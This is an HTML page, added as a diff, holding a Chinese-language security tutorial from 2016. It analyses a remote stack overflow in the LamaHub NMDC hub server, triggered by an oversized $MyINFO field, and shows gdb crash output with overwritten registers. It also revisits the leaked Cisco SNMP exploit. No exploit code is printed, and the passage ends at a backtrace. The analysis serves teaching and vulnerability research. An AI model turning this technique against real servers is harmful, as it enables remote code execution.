@@ -1,0 +1,909 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】从NMDC看简单协议漏洞分析 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="NMDC,协议漏洞,漏洞分析,思科SNMP的远程代码执行,方程式"/>
+    
+        <meta name="description" content="NMDC协议的远程代码执行，之所以会选择这个协议，是在我调试这个协议漏洞的过程中，发现这个协议从数据包构造，漏洞成因，服务端分析来看都相对简化易懂，非常适合和我一样对协议漏洞感兴趣或者刚刚入门的小伙伴一起学习，因此分享出来和大家一起交流！"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】从NMDC看简单协议漏洞分析</h2>
+                <div class="article-msg">
+                    <span class="time">2016-10-12 14:11:00</span>
+                    
+                                        <span class="read">阅读：11689次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3095"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3095" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p6.qhimg.com/t01a7d1fb87abfaeda2.jpg" title="t01b002b4eebb67b158.jpg" alt="http://p1.qhimg.com/t01b002b4eebb67b158.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=1353169030" target="_blank" textvalue="k0pwn_ko" style="color: rgb(0, 112, 192); text-decoration: none;"><span style="text-decoration: none; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>k0pwn_ko</strong></span><span style="color: rgb(0, 112, 192);"></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">稿费：500RMB（不服你也来投稿啊！）</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></span></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">协议漏洞一直是一个比较有趣的话题，比如之前二哥在乌云提交的QQ游戏客户端的伪协议漏洞，比如GeekPwn上的TCP协议栈漏洞，比如后来NSA泄露的思科SNMP的远程代码执行，都是各种不同类型的协议漏洞，其实很多著名的协议都存在漏洞而且网上都有对应的漏洞分析。其实无论是对于协议漏洞的挖掘，分析，利用，都需要对协议数据包的构成，处理协议的客户端/服务端等等有所了解。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">当然今天我做的这个分享是最近我看到的一个比较偏门的协议----NMDC协议的远程代码执行，之所以会选择这个协议，是在我调试这个协议漏洞的过程中，发现这个协议从数据包构造，漏洞成因，服务端分析来看都相对简化易懂，非常适合和我一样对协议漏洞感兴趣或者刚刚入门的小伙伴一起学习，因此分享出来和大家一起交流！有不当之处还望多多包含，多多指正！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">先看看SNMP协议</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在分析这个NMDC协议之前，想先和大家一起来看看前端时间泄露的思科SNMP协议漏洞，其实在安全客有一篇文章</span><a href="http://bobao.360.cn/learning/detail/3053.html" target="_self" style="text-decoration: none;"><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">[揭开思科ASA防火墙网络军火的面纱]</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于这个协议漏洞已经进行了详细的分析，这里再次提到这个漏洞，是因为想和大家再次回顾一下这个漏洞的数据包构造，因为实际上对于一个协议服务端漏洞，是需要了解协议数据包的结构，才能针对具体的结构构造特殊的参数来挖掘，复现漏洞场景。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先搭建一个简单的思科防火墙环境，然后利用Exploit完成利用。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t014bbac8c335bfb367.png" title="t0160e49a65af2db6dc.png" alt="http://p8.qhimg.com/t0160e49a65af2db6dc.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过wireshark抓包，观察这个SNMP协议包。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0136ce55e883d3999e.png" title="t0189d87ebb47729620.png" alt="http://p5.qhimg.com/t0189d87ebb47729620.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到，在SNMP协议包里包含了getBulkRequest字段，这个字段是SNMPv2之后加入的新的PDU，该PDU是用来有效检索块中数据，加快交互效率用的。问题就出现在这个PDU中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">仔细分析SNMP协议，可以看到其中包括了版本号，应答方ID等信息，其中variable-bindings的value值中包含了溢出的payload，在思科防火墙的lina中处理这个数据包时，会引发一个缓冲区溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实看完这篇分析的文章，可以想到在进行协议分析的时候，对协议数据包的构造，每个指令包含的内容是对协议漏洞分析一个必不可少的环节，接下来通过相对复杂的SNMP协议，来看一下文章的主角NMDC协议。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">NMDC简单协议</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">NMDC协议主要负责的是P2P客户端服务器交互的一种文件共享协议，用于实现Client和Hub之间的交互，其中，NMDC提供了很多交互的指令，在服务端会识别这些指令做出相应的回应。这里列举一些交互的指令功能。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Hub端：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$Lock</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$Lock &lt;lock&gt; Pk=&lt;pk&gt;|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于刚刚建立连接的时候，确认当前客户端连接当前的服务端，可以理解为确认连接的唯一性。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$GetPass</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$GetPass|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于向客户端发送消息，要求客户端提供密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$LogedIn</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$LogedIn &lt;nick&gt;|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于登陆成功后告知客户端，同时发送的内容有该客户端的用户名。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Client端：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$Supports：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$Supports &lt;extension1&gt; &lt;extension2&gt; ... &lt;extensionN&gt;|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于声明NMDC支持的协议扩展。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$ValidateNick ：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$ValidateNick &lt;nick&gt;|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于确认当前可使用的用户名。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$MyPass：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$MyPass &lt;password&gt;|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于在接收到服务端的请求指令后，向服务端发送密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$GetNickList：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$GetNickList|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要用于向服务端请求当前的用户名列表。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">$MyINFO ：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">指令格式：$MyINFO $ALL &lt;nick&gt; &lt;description&gt;$ $&lt;connection&gt;&lt;flag&gt;$&lt;e-mail&gt;$&lt;sharesize&gt;$|</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用于向服务端提供当前客户端的信息，而问题就出现在这里面。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">来看一下一个简单的Client和Hub交互的图解：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t012c5230015ec6cc6c.png" title="t0126f6b8d3a657ffe1.png" alt="http://p7.qhimg.com/t0126f6b8d3a657ffe1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这次的协议漏洞的问题就出现在$MyINFO中，通过构造特殊的$MyINFO的指令发送给Hub端，在Hub端处理$MyINFO指令参数的时候，会引发一个简单的栈溢出，文章的主角LamaHub就是这样一个处理NMDC协议的Hub端，它在解析MyINFO的指令的时候，会由于memcpy函数没有对长度进行限制，导致栈溢出。在阅读了NMDC指令格式之后可以来看一下NMDC发送的数据包。首先是TCP握手：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t011dd508a96179ac56.png" title="t015edcd733bd529f2c.png" alt="http://p3.qhimg.com/t015edcd733bd529f2c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">紧接着会进入之前提到的交互部分，会实现NMDC协议握手的过程，来看一下完整的交互包。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01c90faa4ac5ee0a00.png" title="t01ac021f71d5e42f9a.png" alt="http://p4.qhimg.com/t01ac021f71d5e42f9a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到实际上在NMDC握手的时候，就包含了交互需要的一些指令，通过“ | ”连接，那么实际上可以猜测LamaHub在处理NMDC协议的时候的一个处理流程。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t019385272ebecf3b9d.png" title="t01a9410385a7d2a584.png" alt="http://p5.qhimg.com/t01a9410385a7d2a584.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了解了指令格式，以及Client和Hub的交互过程，在下一节的漏洞分析的过程中，可以很清晰的看到这个交互过程LamaHub都做了些什么工作，以及最后为什么会引发缓冲区溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从NMDC到LamaHub漏洞</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">LamaHub是NMDC协议的一个服务端，在LamaHub服务器处理客户端请求的时候，通过构造特殊的NMDC协议数据包，可以导致LamaHub在处理$MyINFO指令请求的时候产生缓冲区溢出，从而远程执行任意代码，下面对此漏洞进行分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先部署LamaHub，用gdb attach，运行PoC，服务端崩溃，可以查看崩溃时的信息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;run
+Starting&nbsp;program:&nbsp;/root/Desktop/0.0.6.2/server&nbsp;
+&gt;&nbsp;ERROR&nbsp;-&gt;&nbsp;Plugin&nbsp;-&gt;&nbsp;File&nbsp;plugins.conf&nbsp;dont&nbsp;found
+&gt;&nbsp;init&nbsp;()&nbsp;-&gt;&nbsp;OK
+&gt;&nbsp;started&nbsp;on&nbsp;port&nbsp;-&gt;&nbsp;4111
+&gt;&nbsp;new&nbsp;client&nbsp;-&gt;&nbsp;127.0.0.1&nbsp;-&gt;&nbsp;4
+Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x1&nbsp;
+EBX:&nbsp;0x2c2c2c2c&nbsp;(&#39;,,,,&#39;)
+ECX:&nbsp;0x0&nbsp;
+EDX:&nbsp;0x5&nbsp;
+ESI:&nbsp;0x2c2c2c2c&nbsp;(&#39;,,,,&#39;)
+EDI:&nbsp;0x2c2c2c2c&nbsp;(&#39;,,,,&#39;)
+EBP:&nbsp;0x2c2c2c2c&nbsp;(&#39;,,,,&#39;)
+ESP:&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0x80626d6&nbsp;--&gt;&nbsp;0x0&nbsp;
+EIP:&nbsp;0x8066a2a&nbsp;(&quot;idateNick&nbsp;Pierre|$Ven&nbsp;1,0091|$G\001&quot;)
+EFLAGS:&nbsp;0x10286&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8066a27&nbsp;&lt;buf+39&gt;:push&nbsp;&nbsp;&nbsp;esi
+&nbsp;&nbsp;&nbsp;0x8066a28&nbsp;&lt;buf+40&gt;:popa&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;0x8066a29&nbsp;&lt;buf+41&gt;:ins&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;es:[edi],dx
+=&gt;&nbsp;0x8066a2a&nbsp;&lt;buf+42&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[ecx+eiz*2+0x74],0x63694e65
+&nbsp;&nbsp;&nbsp;0x8066a32&nbsp;&lt;buf+50&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[eax],0x50
+&nbsp;&nbsp;&nbsp;0x8066a35&nbsp;&lt;buf+53&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[ebp+0x72],0x247c6572
+&nbsp;&nbsp;&nbsp;0x8066a3c&nbsp;&lt;buf+60&gt;:push&nbsp;&nbsp;&nbsp;esi
+&nbsp;&nbsp;&nbsp;0x8066a3d&nbsp;&lt;buf+61&gt;:outs&nbsp;&nbsp;&nbsp;dx,BYTE&nbsp;PTR&nbsp;gs:[esi]
+[------------------------------------stack-------------------------------------]
+0000|&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0x80626d6&nbsp;--&gt;&nbsp;0x0&nbsp;
+0004|&nbsp;0xbffff2c4&nbsp;--&gt;&nbsp;0xb1b1b1b1&nbsp;
+0008|&nbsp;0xbffff2c8&nbsp;--&gt;&nbsp;0xb1b1b1b1&nbsp;
+0012|&nbsp;0xbffff2cc&nbsp;--&gt;&nbsp;0xb1b1b1b1&nbsp;
+0016|&nbsp;0xbffff2d0&nbsp;(&quot;770,INFO$\312\312\312\312&nbsp;ZPe0&nbsp;|\b\363\377\277&quot;)
+0020|&nbsp;0xbffff2d4&nbsp;(&quot;INFO$\312\312\312\312&nbsp;ZPe0&nbsp;|\b\363\377\277&quot;)
+0024|&nbsp;0xbffff2d8&nbsp;--&gt;&nbsp;0xcacaca24&nbsp;
+0028|&nbsp;0xbffff2dc&nbsp;--&gt;&nbsp;0x505a20ca&nbsp;
+[------------------------------------------------------------------------------]
+Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
+Stopped&nbsp;reason:&nbsp;SIGSEGV
+0x08066a2a&nbsp;in&nbsp;buf&nbsp;()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到，此时程序处于08066a2a地址位置，通过PoC，此时是处于返回地址eip部署的恶意地址，这个是PoC给出的，根据系统可以修改eip地址使其跳转到shellcode，通过bt查看一下堆栈回溯。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;bt
+#0&nbsp;&nbsp;0x08066a2a&nbsp;in&nbsp;buf&nbsp;()
